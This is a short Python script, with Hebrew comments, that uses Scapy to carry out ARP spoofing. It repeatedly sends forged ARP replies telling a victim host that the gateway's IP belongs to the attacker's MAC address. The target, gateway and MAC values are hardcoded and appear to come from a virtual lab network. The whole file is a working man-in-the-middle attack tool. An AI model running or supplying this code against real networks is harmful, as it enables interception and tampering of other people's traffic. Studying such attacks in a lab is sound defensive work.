from scapy.all import ARP, Ether, send
import time

from scapy.sendrecv import sendp

# פרמטרים קבועים (ניתן לשנות ידנית)
interface = "eth0"
gateway = "172.20.10.1"  # כתובת ה-IP של ה-Gateway במחשב הווירטואלי
source = "172.20.10.4"   # כתובת IP של התוקף (המחשב הווירטואלי)
delay = 0.00001
gate_away = False
target = "172.20.10.5"  # כתובת IP של המחשב הקורבן

msg = """
Spoof ARP tables
optional arguments:
  -h, --help              show this help message and exit
  -i IFACE, --iface IFACE Interface you wish to use
  -s SRC, --src SRC       The address you want for the attacker
  -d DELAY, --delay DELAY Delay (in seconds) between messages
  -gw                     should GW be attacked as well
  -t TARGET, --target TARGET IP of target
"""

def spoof(msg, i, s, d, gw, t):
    if i is None or s is None or d is None or gw is None or t is None:
        print(msg)
        return

    # יצירת חבילת ARP מזויפת עם הכתובת של ה-Gateway
    arp_packet = Ether(dst="76:0B:21:0D:C7:27") / ARP(
        op=2,                    # תגובה (is-at)
        hwsrc="8E:EB:08:97:13:F6",  # כתובת MAC של המחשב הווירטואלי
        psrc=gw,                # כתובת IP של ה-Gateway שנזייפה (של המחשב הווירטואלי)
        hwdst="76:0B:21:0D:C7:27",  # לכל הרשת
        pdst=t                  # כתובת IP של הקורבן
    )

    print("[*] Sending spoofed ARP packets. Press Ctrl+C to stop.")
    while True:
        sendp(arp_packet, iface=i, verbose=False)
        arp_packet.show()
        print(f"[+] Spoofed packet sent to {t}: {gw} is-at {arp_packet.hwsrc}")
        time.sleep(d)

def main():
    # יש להוסיף את הפרמטרים המתאימים כאשר מריצים את הקוד
    spoof(msg, interface, source, delay, gateway, target)

if __name__ == "__main__":
    main()